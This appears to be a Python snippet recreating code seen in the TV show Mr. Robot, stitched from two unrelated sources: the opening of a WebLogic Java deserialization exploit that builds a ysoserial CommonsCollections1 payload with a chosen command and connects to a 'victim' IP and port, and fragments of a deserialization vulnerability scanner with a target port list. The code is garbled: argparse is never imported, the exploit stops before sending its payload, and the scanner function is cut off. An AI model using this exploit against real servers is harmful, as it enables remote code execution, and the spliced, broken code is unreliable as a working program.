"""
	Mr. Robot - s03e07 40:05
	
	Sources: 
	- https://github.com/johndekroon/serializekiller/blob/master/serializekiller.py
	- https://github.com/ZonkSec/weblogic-serialization-exploit-updated/blob/master/weblogic.py
"""


#!/usr/bin/python
import socket
import sys
import os


#check for args, print usage if incorrect
if len(sys.argv) != 5:
    print '\nUsage:\nweblogic.py [victim ip] [victim port] [path to ysoserial] \'[command to execute]\'\n'
    sys.exit()


#generates ysoserial payload
os.system('java -jar ' + sys.argv[3] + ' CommonsCollections1 ' + '\'' + sys.argv[4] + '\' > payload.out')

#setup socket and connect to victim
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = (sys.argv[1], int(sys.argv[2]))

# ------------------------------------------- #

parser = argparse.ArgumentParser(
    prog='serializekiller.py',
    formatter_class=argparse.RawDescriptionHelpFormatter,
    description="Scan for Java Deserialization vulnerability.")
parser.add_argument('--url', nargs='?', help="Scan a single URL")
parser.add_argument('file', nargs='?', help='File with targets')
args = parser.parse_args()


def saveToFile(result):
    with open('result.txt', 'a') as f:
        f.write(result)
        f.close()

def nmap(host, *args):
    global shellCounter
    global threads
    global target_list

    # All ports to enumerate over for jboss, jenkins, weblogic, websphere
    port_list = ['80', '81', '443', '444', '1099', '5005',
                 '7001', '7002', '8080', '8081', '8083', '8443',
                 '8880', '8888', '9000', '9080', '9443', '16200']

